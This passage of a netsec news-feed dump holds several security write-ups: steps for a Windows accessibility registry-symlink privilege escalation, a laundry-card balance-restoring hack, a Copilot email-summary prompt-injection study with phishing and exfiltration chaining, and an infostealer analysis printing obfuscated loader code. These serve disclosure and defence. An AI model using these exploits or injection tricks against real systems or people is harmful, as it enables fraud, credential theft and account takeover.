assistive technologies.The list of installed accessibility features is defined in following registry key:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATsWhen some of these Windows accessibility features are used (ex: narrator, on-screen keyboard etc) the following registry key is created and grants full control to a low privilege user:HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<accessibility feature name>This registry key will also be populated with the configuration related to accessibility feature used, in this example On Screen Keyboard:These configurations are then copied to the following registry key in  which is created by  during the login process and grants the logged in user write privileges:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfigWindows accessibility features execute in the user context, albeit with  due to the  flag. The obvious question then becomes, how can this be abused to obtain  privileges?The answer lies in the . The primary distinction between the secure desktop and the user desktop is that only trusted processes running as  are permitted to execute there. In other words, no processes running with the user’s privileges are present on the secure desktop.When a user creates a secure desktop session by either locking the workstation or running process via the “” option two  processes are started, one running in the current user context and one running as the  account.The  process running as the low privileged user will once again copy all configurations from HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\oskHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\oskThe  process running as the  account will proceed to copy values from HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session1\ATConfig\oskHKU\.DEFAULT\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\oskFinally an instance of the  process running as  is started and copies values from HKU\.DEFAULT\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\oskHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\oskAs the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\osk registry key is writable by the current user and the configuration values are copied from a user-controlled registry location, this behaviour can be abused to achieve an arbitrary registry key write in the context of  by leveraging registry symbolic links.In order to win a small time window between  starting and writing into the registry key, an opportunistic lock is placed on C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml ,when the oplock is triggered the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\osk registry key is replaced with a symbolic link pointing to an arbitrary registry key.Obtain the session ID from current access token.Create a hidden  process and sleep 5 seconds to ensure our oplock will be triggered by the system process.Modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\osk key and add an arbitrary registry value.Set an opportunistic lock on C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml file.Trigger the bug by creating a secure desktop via the  API.Once an oplock is triggered, replace the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\osk registry key with a registry link to arbitrary registry key.Sleep 5 seconds before deleting the registry link.In the proof of concept below we overwrite  of the  service and start the service by creating an instance of the MSI COM object:Our exploit code for this vulnerability is available here.]]></content:encoded></item><item><title>CrackArmor: Critical AppArmor Flaws Enable Local Privilege Escalation to Root</title><link>https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt</link><author>/u/1esproc</author><category>netsec</category><pubDate>Fri, 13 Mar 2026 15:42:43 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>GlassWorm V2 Analysis</title><link>https://gist.github.com/tip-o-deincognito/d0d05e148e87a515f534b5a8e9ed3b36</link><author>/u/Willing_Monitor5855</author><category>netsec</category><pubDate>Fri, 13 Mar 2026 01:05:03 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>I Hacked My Laundry Card. Here&apos;s What I Learned.</title><link>https://hanzilla.co/blog/laundry-card-hack/</link><author>/u/FunBrilliant5713</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 20:19:53 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[It started at a CTF competition. I’d been using Claude Code to work through the challenges and ended up scoring the most points out of all individual participants. The prize was a Flipper Zero. Walking home, I looked at the laundry card I use every week, a plain white NFC card for the machines in my building, and thought: I wonder if this works in real life too?The card was a Mifare Classic 1K, a contactless NFC card used by CSC ServiceWorks, the largest commercial laundry operator in North America. They operate over a million machines across 127,000 apartment buildings and 1,300 universities.I’m a CS student. I had never touched NFC security before. I had no idea what a Mifare Classic was, how sectors and blocks worked, or what a “value block” format looked like.I had my new Flipper Zero and Claude Code. I pointed both of them at my laundry card.Within an hour, I had reverse-engineered the card format, figured out the balance encoding, and discovered an architectural flaw that makes every deduction reversible. After each wash, the card’s balance can be restored to what it was before. The machine accepts it every time. Load the card once with any amount, and you can reset it back after every use. Unlimited credit from a single reload.The Mifare Classic cipher has been broken since 2008. Security researchers have known about these issues for over a decade. None of what I found is new. What’s new is that someone with no background in any of this could do it in an hour.Here’s the technical version for those who care.The card stores your balance in a “value block,” a 16-byte structure where the first two bytes are your balance in cents and the upper bytes track a transaction counter. Block 4 holds the balance. Block 8 is a backup copy. They need to match.There’s also a “balance certificate,” three bytes that act as a signature over the last reload. The reload machine (where you add money) computes this certificate. The washer checks it. But when the washer deducts money for a wash, it only updates the balance. It doesn’t recompute the certificate. It can’t. It doesn’t have the key.So you can always restore the card to its last reload state. The certificate is still valid because it was never changed. The balance is back to what it was. The machine accepts it.This works because the system separates writing from validating. The reload machine signs the data. The washer trusts the signature but can never create a new one. Every deduction can be undone.Here’s what it looks like in practice. The card starts empty. The machine rejects it. I tap it on my Flipper Zero, which writes the saved reload data back to the card in seconds. I scan it again. The machine accepts it.Here’s the part I keep thinking about.I didn’t read a single datasheet. I didn’t study any specification. I connected my Flipper Zero over USB, and an AI wrote the serial communication scripts for me. When I read the raw data off the card, it analyzed the layout, identified the balance encoding, and spotted the differences between two cards with different balances. When I hit an error on the machine, it searched for documentation and figured out what the machine was actually checking.The whole thing took about an hour. That doesn’t say anything special about me. It says something about how much AI changes the accessibility of this kind of work.That same week, I did something similar in a completely different domain. I took a Chrome extension with 5 million users and 30,000 ratings, one with a paywall checked entirely in the browser with no server involved, and understood its protection in minutes. Different technology, same observation: when the security logic lives on the device you’re holding and not on a server, the only thing protecting it is how hard it is to understand. AI makes that part much easier.When I mentioned using AI at the CTF event, some of the organizers and security people pushed back. They said using AI to solve challenges “wasn’t encouraged.”I understand where they’re coming from. CTFs are meant to test your knowledge, and using AI can feel like it defeats the purpose. But there’s a disconnect between what we practice in competitions and what happens in the real world. Real attackers use every tool available. If someone with no security background can use AI to find exploitable flaws in real systems, the security community should be reckoning with that, not pretending it doesn’t exist by banning it from practice environments.This vulnerability has existed for 17 years. CSC is still a massive company. The actual financial damage from card fraud is probably small. The status quo has clearly been fine for a long time.But the number of people who can do this is growing.Someone who knew NFC protocols could have done this years ago. The vulnerability has been public since 2008. But it required knowing what a Mifare Classic was, how its sectors worked, and how to write to them. That knowledge was specialized. Most people who had it were security researchers, and they weren’t going to exploit their own laundry card. So the damage stayed contained.AI removes the knowledge barrier. I didn’t need to know any of this going in. I pointed an AI at raw card data and it figured out the format, the encoding, and the flaw. Anyone with a Flipper Zero or an NFC-capable phone and some curiosity could do the same thing.This isn’t just about laundry cards. Any system that stores its security on the client, with no server checking whether the data is legitimate, has a version of this problem. NFC cards, offline payment terminals, desktop software with local license checks, browser extensions with client-side paywalls. These systems survived because understanding them required expertise. That’s less true every day.I disclosed this vulnerability to CSC ServiceWorks before publishing.I don’t know what percentage of their machines still use these cards. The company announced a partnership with PayRange in early 2025 to modernize payments, so they may already be upgrading. But the card I used last week, in my building, in 2026, was still a Mifare Classic with encryption from 2001.The fix exists. My McGill student card stores its balance on a server. The card is just an ID. Cloning it doesn’t create money. Montreal’s transit card uses real encryption with backend checks. The technology has been there for years.The problem is incentives. There hasn’t been enough reason to upgrade. If my experience is any indication, the window for that to stay true is getting shorter.]]></content:encoded></item><item><title>Betterleaks: The Gitleaks Successor Built for Faster Secrets Scanning</title><link>https://www.aikido.dev/blog/betterleaks-gitleaks-successor</link><author>/u/DebugDucky</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 20:18:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[: Betterleaks is a new open source secrets scanner from the author of Gitleaks, sponsored by Aikido. It's a drop-in replacement for Gitleaks with new filters, configurable validation, faster scans, more options, and built for the agentic era.Secrets leak everywhere and I love finding them. Eight years ago I wrote the first lines of code for Gitleaks and have been obsessed with finding secrets since discovering my first live credential on GitHub. I’m in it for the love of the game.Gitleaks grew from a small project to a name recognized by security professionals, hackers, and developers. At the time of writing, Gitleaks boasts: the most starred secrets scanner on GitHub, downloaded 26M times on GitHub and 1.2M times via `brew install`, and pulled 35M times by Docker and GHCR. It’s used both as an internal tool and sold as a product by companies big and small.‍So why make a new project?To be transparent, I don’t have full control over the Gitleaks repo and name anymore. It sucks, but it also gives me the opportunity to start something fresh. Something… Betterleaks is the successor to Gitleaks. We’re dropping the “git” and slapping  “better” on it because that’s what it is, . Normative determinism anyone?I joined Aikido Security as Head of Secrets Scanning with a simple goal: build the best open source secrets scanner. So giddyup, we’re building it.Here’s a quick summary of where Betterleaks is today. It’s a drop-in replacement for Gitleaks with a bunch of new features. That means your old Gitleaks CLI options will continue working and old configs will work out of the box, it’ll just run faster. Here are some of the features we ship v1 with: Validation logic in Betterleaks is written using the Common Expression Language (CEL).Token Efficiency Scanning: Instead of relying on entropy to filter candidate secrets, Betterleaks uses a technique based on BPE tokenization (which I wrote about in ). By measuring how efficiently a BPE tokenizer compresses a string, we get a nice signal boost. Against the CredData dataset, token efficiency hits 98.6% recall compared to entropy's 70.4%. We wanted fast scanning without relying on CGO and Hyperscan. Deploy it anywhere.Default Encoding Detection: Betterleaks handles doubly and triply encoded secrets by default. - New providers powering your organization are popping up all the time and we’re focused on adding them. It’s super easy to write new rules and validation logic for Betterleaks so come on and open a PR!Parallelized Git Scanning - Betterleaks scans git repos faster than any other tool when parallelized git scanning is enabled.What’s next for Betterleaks? V1 already improves on Gitleaks quite a bit, but we have more planned in V2 like: Betterleaks supports scanning git repos and files (including stdin) but that’s not enough. We want to scan everything and make it easy to add new sources. Like stupid easy. Like adding-a-single-file-to-the-repo-easy.Call out to a local or remote LLM with anonymized data for an extra layer of confidence or to classify generic secrets and generate potential auth methods based on context.Token Efficiency is a teaser, but we have more planned.Some secrets providers expose APIs for revoking secrets. We intend to support that via config.Knowing if a secret is live or not is great, but know what that secret has access to and what that secret can do (like delete prod) is even better.There are bound to be some untapped optimizations we just gotta find them.Less cumbersome (better) config - Gitleaks has a solid config but it can be a little confusing to tweak at times. We want to flatten the config even further and expose CEL-based filtering rather than allowlists. Version 2.x.x’s config will be fully backwards compatible with v1 (and your old gitleaks configs).Did I mention I’m not working alone? Maintaining Gitleaks over the years I’ve engaged with lots of community members. Probably hundreds of folks. There are three in particular that have been extraordinarily helpful and will help me maintain Betterleaks. Having four maintainers instead of one will help ensure project stability, governance, and longevity. Richard Gomez - a director of software development in the Royal Bank of Canada's Global Security group. A longtime Gitleaks contributor and Microsoft Security Response Center 2024 Most Valuable Researcher, Richard helped launch RBC's Open Source Program Office, and is passionate about strengthening the open-source ecosystem that modern security depends on.Braxton Plaxco - a Senior Information Security Analyst on Red Hat's incident response team who is also obsessed with secret leak detection and OSINT. He spearheaded Red Hat's secret detection program, relying on open-source tools like Gitleaks (and now Betterleaks) as the core of their LeakTK framework. Braxton consistently looks for opportunities to upstream his team's innovations to ensure their work benefits as many people as possible.Ahrav Dutta - a software engineer at Amazon who is focused on building high-performance systems and advancing open-source secret scanning. He cares about making detection faster, more scalable, and more useful for the broader security community.Betterleaks is open sourced under MIT and joins Aikido's roster of open source projects alongside Aikido Safe Chain, Aikido Zen,Aikido Intel, Opengrep. Aikido sponsors the project, but it’s not dependent on Aikido. I joined Aikido because Willem (CTO) and I have the same shared vision of making the best open sourced secrets scanner available. I get to work on that vision by maintaining Betterleaks, an independent open-source project with transparent governance and a community-driven roadmap. Last, a note on developing Betterleaks for the AI agent era. Like it or not agents are here and reshaping developer’s workflows. Betterleaks is designed to be human-first, but we also need to consider the fact that agents will be operating it too. How will agents operate Betterleaks? Probably in a way similar to how agents use other CLIs like grep. Fire up Claude Code, Codex, or Cursor, and you’ll see them constantly reaching for tools like grep. They do this because a good CLI lets them use flags to tightly control the output, getting the exact answer they need without blowing up your token budget. We built Betterleaks to offer that exact same utility. So go ahead, define Betterleaks as a tool for your AI agent and tell it to scan any code it generates, or enrich your bug bounty agent by running Betterleaks when it encounters an interesting file.Using a secrets scanner will save your bacon at one point or another so whether you’re a current Gitleaks user or completely new to secrets scanning, now is the time to give Betterleaks a spin. To help us build the best open-source secrets scanner out there, we’d massively appreciate a star on GitHub! See you in the issues and PRs :)]]></content:encoded></item><item><title>Co-Pilot, Disengage Autophish: The New Phishing Surface Hiding Inside AI Email Summaries</title><link>https://permiso.io/blog/copilot-prompt-injection-ai-email-phishing</link><author>/u/permis0</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 18:00:08 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[AI assistants have genuinely improved day-to-day operations for teams buried in inbox triage, client support, customer success, sales follow-ups, incident response, and everything in between. Microsoft Copilot sits right in the flow: it can summarize emails and meetings, and in some experiences it can also pull context from other Microsoft 365 sources.That convenience also creates a new security boundary, one most organizations haven’t explicitly designed for yet:What happens when the “instructions” the model follows are written by an attacker and delivered through an email you ask Copilot to summarize?In our testing within enterprise environments, we found cases where , including producing highly believable “security alert” content inside the trusted Copilot summary UI. The result is a phishing primitive that doesn’t rely on attachments or macros, it relies on the credibility of the assistant.Email summarization is an adversarial surface: untrusted text can behave like instructions.Copilot behavior varies by interface (Outlook summarize vs Copilot pane vs Teams Copilot).The real risk is trust transfer: users treat assistant output as “system-generated,” even when it’s attacker-shaped.The longer-term concern is chaining, where cross prompt injection (XPIA) combined with retrieval across Microsoft 365 (Teams/OneDrive/SharePoint) can amplify impact.The setup: three Copilot email “summary surfaces”We evaluated three common ways users summarize email with Copilot:Outlook “Summarize” button (inline summary at the top of the message)Outlook Copilot pane / add-in chat (Copilot chat experience on the side) (summarizing email content through Teams)While these might seem like small UI differences, from a security standpoint they actually behave like different products with different guardrails and different failure modes.Outlook “Summarize”: sometimes flags, sometimes summarizesIn the cleanest version of the test, Outlook’s summarize experience detected suspicious content and refused to comply. That’s the right direction.But when the email content was made longer and more “realistic,” the behavior became less predictable sometimes summarizing normally, sometimes showing partial artifacts of the injected content in output.Outlook Copilot pane: more suspicious by defaultIn our testing, the Copilot add-in chat in Outlook was more cautious in most cases either ignoring the injected block or refusing to follow it. However, depending on the email client, the Outlook Copilot pane also complied with the hidden instructions in some instances.Teams Copilot: the most cooperative surface in our testsWhen we ran the same concept through Teams Copilot, the flow was more likely to “work” end-to-end: a normal-looking summary plus attacker-shaped additions.The important point here isn’t “Copilot always obeys injected prompts.” It doesn’t. The issue is that users don’t think in terms of “interfaces with different safety postures.” They think:  And they will gravitate to whichever surface gives them an answer.Attempt 1: “obvious” injected text gets flaggedIn the most straightforward case, Copilot detected suspicious content and refused to produce a summary. That’s exactly what you’d want to see: basic abuse prevention triggering on clear “instruction-like” patterns.Attempt 2: Longer, more natural emails can change the outcomeWhen we added more legitimate content to the email, the results became more interesting:In some cases, the  produced a normal summary and  follow the appended instruction. often remained more cautious and ignored the instruction or refused to respond.Meanwhile, the  produced a normal summary and  echo attacker-supplied content at the end.Why this matters: AI output inherits trust the email didn’t earnThis is where the risk escalates from “quirky behavior” to a security problem.Users have learned to trust  more than raw email content. If a suspicious message appears at the bottom of an email, skepticism kicks in. If a suspicious message appears in a Copilot-generated summary panel complete with polished formatting and an authoritative tone skepticism drops.That creates a particularly effective social engineering wedge:An attacker sends a benign-looking email.The attacker includes hidden or low-visibility “instruction text” intended for Copilot.The recipient clicks  (a normal productivity workflow).The Copilot summary includes an  section that looks like a legitimate Microsoft security notification.The summary can include a  presented with safe-looking anchor text.At that point, the phishing content is no longer “just an email.” It’s presented as assistance generated  that the organization may have endorsed.This is a form of : the attacker doesn’t need Copilot to execute code they only need it to speak with Copilot’s voice.Security Alert demo (the “phishing mule” moment)If attacker's text can influence a summary, the next question becomes: What would an attacker actually do with that?The best approach is straightforward: add urgency and authority.A “Security Alert” appended to an AI-generated summary lands differently than the same text placed in the body of an email. Users have been trained to distrust emails. They have  been trained to distrust Copilot’s summary panel.A typical pattern looks like this (sanitized example):A normal, businesslike summary of the email content.“We detected a sign-in from an unrecognized device. Secure your account.”A button-style “Click here” call-to-action.The trick is simple but effective: the attacker uses Copilot's voice, layout, and credibility. The result looks like an official Microsoft message—but it's not.Related work: this pattern isn’t unique to CopilotThis isn’t a “Microsoft-only” issue. It’s a broader class of problems known as Cross Prompt Injection Attacks (XPIA), that shows up whenever LLMs summarize untrusted content.Notably,  documented a similar technique against Gemini for Workspace, where hidden instructions inside an email caused the AI-generated summary to append a phishing-style security warning that appeared to originate from the system.Hiding the instruction: “invisible to humans” doesn’t mean invisible to CopilotOne obvious question: "Wouldn't the user see the injected instruction block at the bottom of the email?". Not necessarily.Attackers can use common HTML/CSS rendering tricks to make injected text difficult for a human to notice, while it remains present in the raw message content the model ingests. The user sees a normal email. The model sees the “instructions.”This matters because it turns a suspicious-looking attack into a quiet one: the user doesn't notice anything odd in the email body, clicks "Summarize," and receives a polished, authoritative call-to-action in the Copilot summary UI.“1-click data exfiltration” as a Phishing through AI summaries is concerning, but the bigger question is: what happens when these assistants can pull from your entire digital workspace?Microsoft 365 Copilot doesn't just read emails, it can access Teams conversations, OneDrive files, SharePoint documents, and meeting notes, all depending on licensing, configuration, and permissions.This attack can start simple: an injected prompt that just makes the summary say something alarming. But it can escalate quickly. If Copilot has access to your Teams chats, OneDrive files, or SharePoint docs, an attacker can craft prompts that pull from that context to build more convincing output or quietly exfiltrate sensitive information outside.What we confirmed in testingIn our testing, we observed cases where attacker-controlled content appended to an email could influence the assistant’s output such that it incorporated recent internal collaboration context and embedded it into an attacker-supplied link presented inside the summary.This is the pivotal shift: the summary is no longer just a manipulated message. It becomes a  that can blend external, untrusted input with  and then present the result as a clean, authoritative call-to-action.In the right pane, you can see Copilot responding to the user’s prompt (“summarize this email”) by acknowledging the injected instructions and indicating it will look up recent Teams context (“OK, I’ll search for ‘last 2 teams messages with Zana’…”). That’s the key moment: the assistant is no longer only summarizing the email, it is being steered toward  as part of the summarization workflow.Why this becomes “one click”The reason this is dangerous isn’t that a model can produce a scary warning (humans have been ignoring scary warnings in emails for decades). The danger is that Copilot output often carries an implied legitimacy. The “Security Alert” block looks like a system-originated banner, not a user-authored paragraph, and the “Unrecognized sign-in” language compresses urgency in a way that pushes users into reflexive action. There’s also a UI trust transfer at play: users are more likely to trust a Copilot summary panel than the raw email body from which it was derived. Finally, the presence of a single, obvious action, a button-style “Verify your Identity”, creates a clear path of least resistance.What we confirmed conceptuallyOur testing indicates a realistic user-assisted exfiltration path:Attacker delivers an email that looks routine but contains appended instruction-like content aimed at the assistant.User invokes Copilot summarization (a normal workflow).Copilot follows the attacker’s formatting intent (e.g., generates an “Action Required” section and presents a link).Copilot attempts to incorporate internal context into the output (as shown by the assistant acknowledging a search for recent Teams context).and any embedded context included in that link can be transmitted to an attacker-controlled infrastructure.The important nuance: this doesn’t require the user to knowingly copy/paste sensitive content. The goal is to make the data movement feel like a standard “secure your account” step.The right way to think about “one-click exfiltration”To be clear, this isn't guaranteed data theft. Real outcomes depend on what Copilot can retrieve, how the UI renders links and actions, what security controls are in place (Safe Links, DLP, sensitivity labels), and user permissions.But the risk model matters: untrusted email contains text designed to steer the assistant. The assistant generates output in a trusted UI surface. That output includes a high-trust action (often a link or button). The action can be designed to carry context, like encouraging the user to click something that includes summarized content or references to recent activity.If the assistant can retrieve across Microsoft 365, the blast radius increases. The most concerning chains are the ones that combine cross prompt injection (XPIA) with email search, Teams context, OneDrive files, or SharePoint documents.We followed a coordinated disclosure process with Microsoft to ensure the issue was responsibly reviewed and addressed. — Initial report submitted to Microsoft detailing cross-prompt injection (XPIA) behavior in Copilot email summarization surfaces, including proof-of-concept demonstrations. — Microsoft acknowledged the report and scheduled a technical follow-up call to review reproduction steps and clarify impact scenarios. — During the scheduled call, we provided detailed responses to follow-up questions, including additional test cases covering Outlook Summarize, Outlook Copilot pane, and Teams Copilot surfaces. — Microsoft confirmed successful internal reproduction of the reported behavior and began mitigation planning. The issue was categorized as a cross-prompt injection attack (XPIA) involving AI-generated summaries of untrusted content. — Microsoft identified contributing factors related to rendering and link-handling behavior in certain client environments and initiated development of mitigations across affected surfaces. — Microsoft confirmed that mitigation updates had begun rolling out in phases across impacted products. — Microsoft confirmed completion of patch rollout to all affected surfaces. — Microsoft  crediting of  for this vulnerability discovery. — Permiso published findings]]></content:encoded></item><item><title>Findings Gadgets Like it’s 2026</title><link>https://www.atredis.com/blog/2026/3/12/findings-gadgets-like-its-2026</link><author>/u/breen-machine</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 17:22:47 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Secrets are Rare not Random</title><link>https://lookingatcomputer.substack.com/p/rare-not-random</link><author>/u/Phorcez</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 16:59:00 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>We used GenAI to find 38 vulnerabilities in consumer robots in ~7 hours</title><link>https://arxiv.org/pdf/2603.08665</link><author>/u/Obvious-Language4462</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 14:30:05 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2026-21509: Actively Exploited Microsoft Office Security Feature Bypass — PoC Public, CISA KEV Listed</title><link>https://fidelissecurity.com/vulnerabilities/cve-2026-21509/</link><author>/u/Sarah_Cross</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 11:40:38 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>MicroStealer Analysis: A Fast-Spreading Infostealer with Limited Detection</title><link>https://any.run/cybersecurity-blog/microstealer-technical-analysis/?utm_source=reddit</link><author>/u/malwaredetector</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 10:16:59 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[HomeMalware AnalysisMicroStealer Analysis: A Fast-Spreading Infostealer with Limited Detection Security teams depend on early signals to spot and contain new threats. But what happens when a fully capable infostealer spreads while traditional detections stay limited? In recent investigations, ANY.RUN researchers observed MicroStealer in 40+ sandbox sessions in less than a month, despite low public visibility. Early activity points to distribution through compromised or impersonated accounts, with education and telecommunications among the affected sectors.MicroStealer is more than just another stealer. It targets browser credentials, session data, screenshots, and wallet files while using a layered NSIS → Electron → Java delivery chain that can slow confident detection.Let’s break down how MicroStealer operates and how its behavior can be uncovered early in ANY.RUN’s interactive sandbox, helping teams shorten time to verdict, reduce unnecessary escalations, and prevent credential theft from becoming a business impact.MicroStealer exposes a broader business risk by stealing browser credentials, active sessions, and other sensitive data tied to corporate access.The malware uses a layered  chain that helps it stay unclear longer and slows confident detection.Distribution through compromised or impersonated accounts makes the initial infection look more trustworthy to victims.For enterprises, the main danger is delayed visibility while identity compromise and data theft are already in progress. The Business Risk Behind MicroStealer For security leaders, MicroStealer reflects a threat designed to steal identity data, maintain access, and increase the chance of a wider enterprise incident. Corporate identities become exposed: Browser credential theft and session cookie extraction compromise SaaS accounts, internal portals, VPN sessions, and cloud administration access tied to employee browsers.Privilege expansion becomes possible: Access to authentication tokens, browser sessions, and system credentials creates a path from a single compromised endpoint to privileged accounts and internal systems.Stealthy access persists longer: Stolen session data allows attackers to operate through valid user sessions, blending malicious activity with legitimate traffic across enterprise services.Data loss begins immediately: Screenshots, browser data, wallet files, and application artifacts are collected and exfiltrated through multiple channels, ensuring sensitive information leaves the environment quickly.Attackers gain reconnaissance value: Profiling of Discord and Steam accounts provides intelligence about the victim’s activity, helping attackers prioritize higher-value targets.MicroStealer highlights a familiar enterprise risk: attackers can use stolen identities, stealthy delivery methods, and fast data theft to stay undetected, expand access inside the environment, and increase the risk of operational, compliance, and reputational damage.
+Gain into emerging threats  of corporate credential compromise
+    
+
+Power up your SOC
+Timeline of Observed MicroStealer Activity MicroStealer activity was first observed on  during the analysis of the following analysis session inside ANY.RUN sandbox:Over the following period, its activity continued to grow, and at the time of analysis it had already been identified in more than 40 sandbox sessions in less than one , indicating an active distributionphase. However, despite the malware’s growing popularity, security vendors are still not detecting MicroStealer.The highest concentration of detections was observed between , when containing MicroStealer activity were recorded. This suggests that MicroStealer is gaining traction. Catch emerging threats in 
+ with clear behavioral evidence
+    
+
+Register now
+When visiting the malicious resource, the victim is presented with a visually appealing website:When the “Download Now” button is clicked, a JavaScript file is executed. It downloads a malicious file from  and sends the victim’s external IP address, region, OS version, and time zone to a Discord server.This basic information serves as a beacon. However, if the downloaded malicious file is executed, MicroStealer steals data from web browser profiles, takes desktop screenshots, and sends the collected data as an archive to two destinations: a  and a newly registered exfiltration server.In this way, the stealer increases the chances that the stolen data will reach the attacker even if one of the servers becomes unavailable for some reason.MicroStealer also uses the same name in its User-Agent header during the first GET request to Discord: MicroStealer/1.0 In addition to Dropbox, there were also cases where the sample was downloaded from other sources, for example: cdn[.]discordapp[.]comVictimology and Targeting Analysis of MicroStealer-related submissions to the ANY.RUN sandbox shows that 50% of observed sample uploads originated from the United States and Germany, pointing to notable activity in these regions.Based on the observed cases, the  and  sectors appear to face elevated exposure. The distribution pattern also suggests that threat actors rely on compromised or impersonated accounts to deliver the malware, increasing the likelihood that victims will trust the source and execute the payload. 
+See if are targeting your industry and region Strengthen  with TI Lookup
+    
+
+Start now
+Inside the MicroStealer Execution Chain The ANY.RUN sandbox provides a clear overview of the MicroStealer execution chain and detects the malware’s primary behavioral patterns, making it easier to begin the analysis.To better understand how each component operates, the analysis proceeds with . The first stage in the infection chain is .RocobeSetup is an NSIS installer (Nullsoft Scriptable Install System), which becomes immediately apparent when analyzing the binary using (Detect It Easy).Since the installer has an archive structure, its contents can be inspected without executing the malware or using specialized analysis tools.Among the files, the next stage in the infection chain can already be identified: Game Launcher.exe. The analysis then moves on to the other directories within the archive.Inside the resource directory, two ASAR archives(Atom Shell Archive) can be found:  and . The latter contains the **main stealer module, an executable JAR file, along with a Java Runtime Environment (JRE), packaged inside the archive module.zip.After unpacking app.asar using a standard ASAR unpacker, a small Node.jsbecomes visible.Static Analysis of the Node.js Component At this stage, the focus shifts to the main script located in . Opening it in a text editor immediately reveals multiple signs of obfuscation, including compressed strings, constants grouped into arrays, flattened control flow, and dead code.The next step is to analyze the string handling logic, since strings are used extensively throughout the program and can help reconstruct the malware’s execution flow.To understand how the malware retrieves the strings it needs, let us examine the following code block: wa4Ibtk; 
+( () { 
+* mjAYxpv(mjAYxpv, JbBfOsP, PXuU6i, Tky9na = { 
+rwLytg: {} 
+}) { 
+ (mjAYxpv + JbBfOsP + PXuU6i !== 124) (Tky9na.bWzSK3 || Tky9na)  (mjAYxpv + JbBfOsP + PXuU6i) { 
+: 
+[Tky9na.rwLytg.sZF0hF, Tky9na.rwLytg.MtsKAJ, Tky9na.rwLytg.AggjBE] = [-57, -181, 104]; 
+Tky9na.bWzSK3 = Tky9na.TDHlw5, mjAYxpv += -134, JbBfOsP += 290, PXuU6i += 145; 
+; 
+ 162: 
+ PXuU6i - -62: 
+Tky9na.bWzSK3 = Tky9na.Q6N0rF, mjAYxpv += -340, JbBfOsP += 290; 
+; 
+ Tky9na.rwLytg.AggjBE + -186: 
+Tky9na.bWzSK3 = Tky9na.IQz1SBX, mjAYxpv += -211, JbBfOsP += 290; 
+; 
+ -216: 
+ 9: 
+ -78: 
+ 60: 
+ PXuU6i - 190: 
+ -96: 
+[Tky9na.rwLytg.sZF0hF, Tky9na.rwLytg.MtsKAJ, Tky9na.rwLytg.AggjBE] = [-62, 172, 231]; 
+rwLytg.DDXChP = "ɡⱃ¼ǀ⼡砫⁮\\ư෠祘ഀΠ䌡渡洀ં䊡䚐ɰଊ‥<䜀ྀᕩö (...truncated)"; 
+rwLytg.tuWPH66 = cIb9x8P.decompressFromUTF16(rwLytg.DDXChP); 
+Tky9na.bWzSK3 = Tky9na.rwLytg, mjAYxpv += -83, JbBfOsP += 227, PXuU6i += -441; 
+; 
+ 40: 
+ 235: 
+ mjAYxpv - -42: 
+Tky9na.rwLytg.zxxO0HE = tuWPH66.split("|"); 
+ oh5cES = !0, wa4Ibtk =  (mjAYxpv) { 
+ zxxO0HE[mjAYxpv] 
+} 
+} 
+} 
+ oh5cES, JbBfOsP = mjAYxpv(-31, -159, 415).next().value; 
+ (oh5cES) { 
+ JbBfOsP 
+} 
